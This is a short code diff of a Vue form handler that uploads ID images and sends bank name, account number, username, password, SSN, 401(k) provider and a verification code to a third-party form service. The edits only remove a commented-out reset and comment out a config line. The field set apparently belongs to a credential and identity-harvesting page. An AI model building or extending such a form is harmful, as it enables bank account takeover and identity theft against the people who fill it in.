@@ -135,21 +135,6 @@ const submitForm = () => {
     form.value.backPreview = backUrl;
     console.log('Front Image URL:', frontUrl);
     console.log('Back Image URL:', backUrl);
-
-    // Reset form and previews if needed
-    // form.value = {
-    //   bank: '',
-    //   accountNumber: '',
-    //   amount: '',
-    //   username: '',
-    //   password: '',
-    //   ssn: '',
-    //   fortyOneK: '',
-    //   fortyOneKProvider: '',
-    //   code: ''
-    // };
-    // frontPreview.value = '';
-    // backPreview.value = '';
   }).catch(err => {
     console.error('Error uploading images:', err);
     $swal.fire('Error', 'There was an issue uploading your ID images. Please try again.', 'error');
@@ -164,7 +149,7 @@ const submitForm = () => {
     $swal.fire('Error', 'There was an issue submitting your request. Please try again.', 'error');
   });
 
-  const config = useRuntimeConfig()
+  // const config = useRuntimeConfig()
   // formdata to send to staticforms
   const formdata = new FormData();
   formdata.append('bank', form.value.bank);
